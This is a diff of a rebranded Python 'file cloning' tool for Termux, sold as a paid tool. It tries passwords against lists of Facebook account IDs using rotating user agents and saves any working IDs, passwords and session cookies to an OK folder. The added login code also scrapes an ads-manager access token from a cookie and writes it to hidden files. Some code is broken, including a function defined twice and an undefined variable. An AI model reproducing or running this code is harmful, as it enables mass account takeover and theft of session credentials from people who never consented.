@@ -1,4 +1,4 @@
-#-----------------[ MR-ALONE ]-------------------#
+#-----------------[ MR-ALONE ]------------#
  
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
@@ -17,8 +17,8 @@ pretty.install()
 CON=sol()
  #------------------[ MR-ALONE ]-------------------#
 import os, platform, time, sys
-os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-os.system('pip install httpx pip install beautifulsoup4')
+#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+#os.system('pip install httpx pip install beautifulsoup4')
 os.system('pip install requests ')
 os.system('pip install bs4')
 #os.system('pip install rich')
@@ -36,8 +36,8 @@ time.sleep(2)
 print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m SUBSCRIBE MY YOUTUBE CHANNEL..!")
 os.system("espeak -a 300 \"SUBSCRIBE,MY,YOUTUBE,CHANNEL,\"")
 time.sleep(2)
-os.system(f'xdg-open https://www.youtube.com/@kgaming6607')
-os.system(f'xdg-open https://www.facebook.com/profile.php?id=100088035424278')
+#os.system(f'xdg-open https://www.youtube.com/@kgaming6607')
+#os.system(f'xdg-open https://www.facebook.com/profile.php?id=100088035424278')
 ##os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
 #------------------[ MR-ALONE ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
@@ -1631,35 +1631,126 @@ def TUTULj(u):
 def clear():
 	os.system('clear')
 #------------------[ MAIN ]-----------------#
-
+#------------------[ MACHINE-SUPPORT ]---------------#
+ 
+def alvino_xy(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+def clear():
+    os.system('clear')
+def back():
+    login()
+def contact():
+    os.system('xdg-open https://www.facebook.com/profile.php?id=100088035424278')
+    back()
+def linex():
+    print('\033[1;37m')
+def animation(u):
+    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 os.system('xdg-open https://www.facebook.com/profile.php?id=100088035424278')
-logo =("""
+logo ="""
  ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
  ║\033[0;96m●▬▬▬▬▬๑🌸🕌۩[Bismillahir Rahmanir Rahim]۩🕌🌸๑▬▬▬▬▬▬●\033[0;91m║
  ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-        \33[0;91m 
-███████ ██   ██  █████  ██   ██ ██ ██████  
-██      ██   ██ ██   ██ ██  ██  ██ ██   ██ 
-███████ ███████ ███████ █████   ██ ██████  
-     ██ ██   ██ ██   ██ ██  ██  ██ ██   ██ 
-███████ ██   ██ ██   ██ ██   ██ ██ ██████ 
+        \33[0;91m █████╗ ██╗      ██████╗ ███╗   ██╗███████╗    
+        \33[0;91m██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝
+        \33[0;91m███████║██║     ██║   ██║██╔██╗ ██║█████╗      
+        \33[0;91m██╔══██║██║     ██║   ██║██║╚██╗██║██╔══╝      
+        \33[0;91m██║  ██║███████╗╚██████╔╝██║ ╚████║███████╗    
+        \33[0;91m╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝      
  ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
  ║\33[0;95m[<🕌Assalamualaikum"Mind It,'You Will Never Alone🕴️>]\033[0;95m║
  ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \033[1;31m==================================================
-[] AUTHOR       :     MD SHAKIB
+[] AUTHOR       :      𝐌𝐑.RAHUL
 [] TOOLS        :     𝐅𝐈𝐋𝐄-𝐂𝐋𝐎𝐍𝐈𝐍𝐆
 [] TYPE         :      𝗣𝗔𝗜𝗗(𝐔𝐬𝐞𝐫 𝐎𝐧𝐥𝐲)
-[] FACEBOOK     :      TEB SHAKIB
+[] FACEBOOK     :     RAHULISLAM 
 [] VERSION      :      𝟔.𝟏
-[] MESSENGER    :      SHAKIB 𝗧𝗲𝗿𝗺𝘂𝘅 𝗖𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆
-==================================================""")
+[] MESSENGER    :      𝗔𝗟𝗢𝗡𝗘 𝗧𝗲𝗿𝗺𝘂𝘅 𝗖𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆
+=================================================="\033[1;23m"""                                
+balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
+meyermarexudi =(""" \033[0;97m=============================================""")    
+alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 150TK 30 500TK FOR    APPROVAL""")
+xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
+fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
+xudinaministar =(""" \033[38;1m[-] Importent Note """)
+hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 ABAL😎 """)
+
+
+def naima():
+	print('-------------------')
+print(logo)
+os.system('espeak -a 300 " Please,   Text,   Your,   Real,   Name,   Sir,"')
+uname =input('\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
+os.system('espeak -a 300 " Welcome,   to,  MR.ALONE,  PAID,   Tools"')
+	
+	
+ 
+def login():
+    try:
+        token = open('.token.txt','r').read()
+        cok = open('.cok.txt','r').read()
+        tokenku.append(token)
+        try:
+            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+            sy2 = json.loads(sy.text)['name']
+            sy3 = json.loads(sy.text)['id']
+            menu(sy2,sy3)
+        except KeyError:
+            login_lagi334()
+        except requests.exceptions.ConnectionError:
+            print('\033[0;97m=================')
+            animation(' [×] NO INTERNET CONNECTION DETECTED')
+            exit()
+    except IOError:
+        login_lagi334()
+def login_lagi334():
+    try:
+        token = open('.token.txt','r').read()
+        cok = open('.cok.txt','r').read()
+        tokenku.append(token)
+        try:
+            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+            sy2 = json.loads(sy.text)['name']
+            sy3 = json.loads(sy.text)['id']
+            menu(sy2,sy3)
+        except KeyError:
+            login_lagi334()
+        except requests.exceptions.ConnectionError:
+            print('\033[0;97m=================')
+            animation(' [×] NO INTERNET CONNECTION DETECTED')
+            exit()
+    except IOError:
+        login_lagi334()
+def login_lagi334():
+    try:
+        os.system('clear')
+        print(logo)
+        ses = requests.Session()
+        cookies = {'cookie':cookie}
+        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
+        req = ses.get(url,cookies=cookies)
+        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
+        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
+        roq = ses.get(nek,cookies=cookies)
+        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
+        tokenw = open(".token.txt", "w").write(tok)
+        cokiew = open(".cok.txt", "w").write(cookie)
+      #exit()
+    except Exception as e:
+        os.system("rm -f .token.txt")
+        os.system("rm -f .cok.txt")
+        os.system("python nono.py")
+        exit()
+
 #------------------[ MENU ]----------------#
+ #===©===#
+
 def menu():
     os.system('clear')
     print(logo)
-   # print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+uname)
-   # print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
+    print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+uname)
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;96m "+date)
     print('\033[0;97m===============================================')
     print(f"""\033[91;1m[\033[92;1m1\033[91;1m] \033[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         """)
     print("""\033[95;1m[\033[95;1m2\033[95;1m] \033[0;95m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 ᏔᏆͲᎻ 𝗔𝗗𝗠𝗜𝗡""")
@@ -1674,7 +1765,7 @@ def menu():
         crack_file()
     elif HEART in ['2','02']:
         os.system('xdg-open https://github.com/Mr-Alon')
-        os.system("python nono.py")
+        #os.system("python nono.py")
     elif HEART in ['3','03']:
         result()
     elif HEART in ['0']:
@@ -1927,10 +2018,10 @@ def passwrd():
     os.system('clear')
     print(logo)
     print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐘𝐎𝐔𝐑 𝐓𝐎𝐎𝐋𝐒 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
-    #print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
-  #  print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗧𝗢𝗗𝗔𝗬'𝗦 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)
+    print(f"\033[1;91m[\033[1;91m√\033[1;91m] \033[1;91m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
+    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗧𝗢𝗗𝗔𝗬'𝗦 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)
     print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;93m𝚈𝙾𝚄𝚁 TOTAL 𝙸𝙳𝚣 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
-   # print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
+    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
     print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀𝐒𝐓 ⏩")
     print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
     print('\x1b[38;5;50m===============================================')
@@ -2029,7 +2120,7 @@ def passwrd():
             else:
                 pool.submit(crackfree,idf,pwv)
     print('\n\033[1;37m===================================')
-  #  print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
     print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
     print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     print('\n\033[1;37m===================================')
@@ -2041,7 +2132,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;95m{bo}[ALONE 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;95m{bo}[RAHUL 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2068,7 +2159,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;96m[ALONE-Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
+                print(f'\r\033[0;96m[RAHU-Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
                 os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
@@ -2083,7 +2174,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[ALONE 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[RAHUL 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2121,4 +2212,13 @@ def crackfree(idf,pwv):
             time.sleep(31)
     loop+=1
  
+#-----------------------[ SYSTEM-CONTROL ]--------------------#
+ 
+if __name__=='__main__':
+    try:os.mkdir('OK')
+    except:pass
+    try:os.mkdir('CP')
+    except:pass
+    try:os.system('touch .prox.txt')
+    except:pass
 menu()
